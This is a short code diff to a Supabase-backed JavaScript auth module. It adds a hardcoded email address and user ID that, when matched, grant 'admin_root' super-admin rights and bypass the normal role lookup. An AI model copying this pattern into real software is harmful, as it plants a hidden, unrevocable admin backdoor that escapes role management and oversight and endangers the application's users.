@@ -2,6 +2,9 @@ import { supabase } from "./supabase.js";
 
 let cachedUserContext = null;
 
+const SUPER_ADMIN_EMAIL = "santiagoelchameluco@gmail.com";
+const SUPER_ADMIN_ID = "1e17e7c6-d959-4089-ab22-3f64b5b5be41";
+
 const normalizeEmail = (value) => String(value || "").trim().toLowerCase();
 const normalizeRole = (value) => String(value || "").trim().toLowerCase();
 
@@ -15,6 +18,15 @@ const isRecordActive = (record) => {
 
 async function getSuperAdminContext(user) {
   const email = normalizeEmail(user?.email);
+  if (user?.id === SUPER_ADMIN_ID || email === SUPER_ADMIN_EMAIL) {
+    return {
+      user,
+      rol: "admin_root",
+      empresa_id: null,
+      super_admin: true
+    };
+  }
+
   const filters = [];
   if (user?.id) filters.push(`id.eq.${user.id}`);
   if (email) filters.push(`correo.eq.${email}`);
